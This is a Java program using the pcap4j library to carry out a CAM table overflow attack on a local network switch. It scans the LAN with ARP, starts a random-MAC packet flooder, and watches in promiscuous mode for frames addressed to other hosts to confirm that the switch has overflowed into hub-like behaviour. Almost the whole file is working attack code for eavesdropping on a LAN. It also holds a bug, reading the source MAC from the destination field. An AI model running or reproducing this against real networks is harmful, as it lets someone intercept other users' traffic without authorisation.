import java.io.IOException;
import java.net.InetAddress;
import java.util.LinkedHashMap;
import java.util.Map;
import org.pcap4j.core.BpfProgram.BpfCompileMode;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;

public class CAMOverflow {
	static LinkedHashMap<InetAddress, MacAddress> ip2Mac = new LinkedHashMap<InetAddress, MacAddress>();
	static LinkedHashMap<MacAddress, InetAddress> mac2IP = new LinkedHashMap<MacAddress, InetAddress>();
	public static void main(String [] args) throws PcapNativeException, NotOpenException, IOException {

		PcapNetworkInterface nif = null;
		try {
			nif = new NifSelector().selectNetworkInterface();
		}catch(Exception e) {}
		if(nif==null) return;

		PcapHandle handle = new PcapHandle.Builder(nif.getName())
				.snaplen(65535)			// 2^16
				.promiscuousMode(PromiscuousMode.PROMISCUOUS)
				.timeoutMillis(100)		// ms
				.bufferSize(1024*1024) // 1 MB 
				.build();
		
		PcapHandle handleSend = new PcapHandle.Builder(nif.getName())
				.snaplen(65535)			// 2^16
				.promiscuousMode(PromiscuousMode.PROMISCUOUS)
				.timeoutMillis(100)		// ms
				.bufferSize(1024*1024) // 1 MB 
				.build();
		
		String filter = "arp";
		handle.setFilter(filter, BpfCompileMode.OPTIMIZE);
		
        InetAddress localIP = nif.getAddresses().get(1).getAddress();
        //InetAddress gatewayIP = GetAddress.getGateWayIP(localIP.getHostAddress());
		MacAddress localMac = GetAddress.getLocalMac(localIP);
		//MacAddress gatewayMac = GetAddress.getMac(handle, localIP, localMac, gatewayIP);

		System.out.print  ("Local IP is: ");
		System.out.println(localIP.getHostAddress());
		System.out.print  ("Local MAC is: ");
		System.out.println(GetAddress.getMacString(localMac));
		/*System.out.print  ("Gateway IP is: ");
		System.out.println(gatewayIP.getHostAddress());
		System.out.print  ("Gateway MAC is: ");
		System.out.println(GetAddress.getMacString(gatewayMac));*/
		
		GetAddress.findAllDevices(handle, handleSend, localIP, localMac);
		
		/*if(ip2Mac.containsKey(gatewayIP)) {
			ip2Mac.remove(gatewayIP);
			mac2IP.remove(gatewayMac);
		}*/
		
		if(ip2Mac.size()==0){
			System.out.println("No other devices in your LAN. Rescaning");
			
		}
		
		System.out.println("All devices in your LAN:");  
		for(Map.Entry<InetAddress, MacAddress> entry : ip2Mac.entrySet()){
			System.out.println(entry.getKey());
		}
			
		/*Scanner scan = new Scanner(System.in);  
        System.out.println("Select your target IP Address:");  
        String t=scan.next();
        scan.close();
        
		InetAddress targetIP = InetAddress.getByName(t);
		MacAddress targetMac = GetAddress.getMac(handle, localIP, localMac, targetIP);
		
		System.out.print  ("Target IP is: ");
		System.out.println(targetIP.getHostAddress());
		System.out.print  ("Target MAC is: ");
		System.out.println(GetAddress.getMacString(targetMac));*/
		
		System.out.println("CAM overflow started");
		
		RandomSender overflowSender = new RandomSender(handleSend);
		
		boolean overflowed = false;
		
		filter = "";
		handle.setFilter(filter, BpfCompileMode.OPTIMIZE);
		
		while (true) {
			Packet packet = handle.getNextPacket();
			if(packet == null) continue;
			MacAddress dstMac = packet.get(EthernetPacket.class).getHeader().getDstAddr();
			MacAddress srcMac = packet.get(EthernetPacket.class).getHeader().getDstAddr();
			if(!srcMac.equals(localMac)&&!dstMac.equals(localMac)&&!dstMac.equals(MacAddress.ETHER_BROADCAST_ADDRESS)&&mac2IP.containsKey(dstMac)){
				if(!overflowed) {
					int cap = overflowSender.cap;
					System.out.println("CAM overflowed");
					System.out.println("CAM table capacity is about ");
					System.out.println(cap);
					overflowed=true;
				}else {
					overflowSender.sleep=true;
				}
			}else
			overflowSender.sleep=false;
		}
	}
	/*private static InetAddress targetSelector(){
		
	}*/
}